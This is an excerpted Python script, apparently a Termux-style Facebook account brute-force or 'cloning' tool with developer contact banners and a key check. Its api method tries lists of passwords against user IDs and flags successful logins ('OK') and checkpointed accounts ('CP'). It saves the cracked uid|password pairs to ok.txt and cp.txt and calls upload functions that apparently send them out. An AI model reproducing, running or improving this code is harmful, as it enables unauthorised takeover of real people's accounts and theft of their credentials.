...
def helpnote():
	...
	subprocess.check_output(["am", "start https://www.facebook.com/rashood.khan.16"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/rashood.khan.16")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923148007918")
	subprocess.check_output(["am", "start", "https://wa.me/+923148007918"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://www.facebook.com/rashood.khan.16').text
			if basesplit in plr:
				key = basesplit
 ...
 > \033[0;92mDEVELOPER     : ⓃⒶⒿⒺⒺⒷ
 > \033[0;95mFACEBOOK      : HAJINAJEEB
 > \033[0;41mWHATSAPP      : +923148007918
 \033[0;96m>  HALAK ME        : ...MR JOKER😹
 > \033[0;97mWARNING       :  KONA WARKOA 
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [HAJI😍] : %s/%s -> \033[0;92m [ HAJI😍-OK:%s ]- \033[0;93m[HAJI😍-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HAJI😍-𝐎𝐊😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [HAJI😍-𝐎𝐊😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[HAJI😍-𝐂𝐏😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [HAJI😍-𝐂𝐏😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
